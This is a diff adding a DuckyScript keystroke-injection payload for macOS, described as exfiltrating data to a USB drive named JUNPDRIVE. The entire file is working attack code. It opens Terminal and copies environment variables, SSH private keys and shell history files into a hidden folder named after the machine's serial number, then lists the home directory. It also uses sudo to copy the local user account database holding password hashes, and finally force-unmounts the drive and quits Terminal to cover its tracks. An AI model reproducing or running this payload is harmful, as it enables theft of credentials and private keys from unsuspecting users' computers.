@@ -1,0 +1,39 @@
+REM Author: Jippen
+REM Description: Exfiltrate data to JUNPDRIVE
+DELAY 500
+
+REM Open a terminal
+GUI SPACE
+DELAY 1000
+STRING terminal
+DELAY 100
+ENTER
+DELAY 1000
+
+REM Ensure we have a clear command line
+CONTROL C
+
+REM Set shortcut env variables
+STRING  export O="/Volumes/JUNPDRIVE/.$(system_profiler SPHardwareDataType|fgrep Serial|cut -d : -f 2|cut -d ' ' -f 2)"
+ENTER
+
+REM Steal Data
+STRING  mkdir -p ${O}/h;env >> ${O}/env;cp -R ~/.ssh ${O}/;cp .bash_* $O/;find ~ -not -path '*/\.*'|python -c "import sys as s;s.a=[];[setattr(s,'a',list(filter(lambda p: c.startswith(p+'/'),s.a)))or (s.stdout.write(' '*len(s.a)+c[len(s.a[-1])+1 if s.a else 0:])or True) and s.a.append(c[:-1]) for c in s.stdin]" > ~/ $O/homedir 
+ENTER
+
+DELAY 1000
+
+REM Steal privilged data
+STRING  sudo cp -R /var/db/dslocal/nodes/Default/users/ $O/h/ 
+ENTER
+STRING a
+CONTROL C
+
+REM Unmount flash drive
+STRING  diskutil unmountDisk force /Volumes/JUNPDRIVE/
+ENTER
+
+DELAY 3000
+
+REM Exit the terminal
+GUI Q
